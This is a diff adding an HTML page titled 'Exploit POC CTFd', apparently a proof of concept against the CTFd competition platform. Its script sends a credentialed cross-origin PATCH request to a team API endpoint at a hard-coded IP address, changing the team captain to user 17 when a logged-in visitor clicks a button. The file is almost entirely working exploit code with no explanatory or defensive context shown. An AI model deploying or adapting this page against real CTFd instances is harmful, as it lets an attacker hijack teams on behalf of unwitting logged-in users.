@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit POC CTFd</title>
+    <script>
+        function sendCORSRequest() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("PATCH", "http://185.202.54.13/api/v1/teams/me", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.withCredentials = true;  
+
+            var data = JSON.stringify({
+                "captain_id": "17"  
+            });
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log("Request successful!");
+                } else if (xhr.readyState === 4) {
+                    console.log("Request failed. Status: " + xhr.status);
+                }
+            };
+
+            xhr.send(data);
+        }
+    </script>
+</head>
+<body>
+    <h1>Exploit Page</h1>
+    <button onclick="sendCORSRequest()">Change Team Captain</button>
+</body>
+</html>
+
